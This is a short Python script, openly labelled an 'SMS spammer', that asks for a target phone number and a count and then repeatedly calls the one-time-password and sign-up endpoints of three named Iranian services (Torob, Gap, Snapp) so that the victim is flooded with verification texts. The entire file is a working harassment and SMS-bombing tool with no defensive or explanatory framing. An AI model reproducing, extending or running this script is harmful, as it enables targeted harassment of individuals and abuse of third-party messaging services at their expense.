import os
import time
import requests

class bcolors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def banner():
    print(bcolors.BLUE + "welcom to SMS spammer ")
    time.sleep(2)
    print(bcolors.GREEN + "made by <kasra akhavan>")
    time.sleep(2)
    print(bcolors.RED + "<<iranian hackers>>")
    time.sleep(2)

def spam():
    try:
        rer = ':'
        phone = input(bcolors.GREEN + "enter target phone number\n<example>: 912*******\n<enter>: ")
        count = input(bcolors.GREEN + "enter spam count: ")
        data ={"cellphone": phone}
        menu = input(bcolors.GREEN + '''choose a server to start spam\n 1)torob server 2)gap server 3)snap server \n<choose>:''')
        if menu == '1':
            for n in range(int(count)):
                time.sleep(2)
                print(bcolors.RED + "SMS send")
                requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + phone)
        elif menu == '2':
            for s in range(int(count)):
                time.sleep(2)
                print(bcolors.RED + "SMS send")
                requests.get("https://core.gap.im/v1/user/add.json?mobile=" + phone)
        elif menu == '3':
            for t in range(int(count)):
                time.sleep(2)
                print(bcolors.RED + "SMS send")
                requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",data)       
    except Exception as e:
        print(bcolors.RED + f"ERORR:{e}")

def start():
    os.system("clear")   
    banner()
    spam()
try:
    start()
except KeyboardInterrupt:
    print(bcolors.BLUE + "you shut me down....")
    exit()
except ZeroDivisionError:
    print(bcolors.RED + "what the hell is ZERO ???!!!!")
    exit()
except Exception as e:
    print(bcolors.RED + f"ERORR: {e}")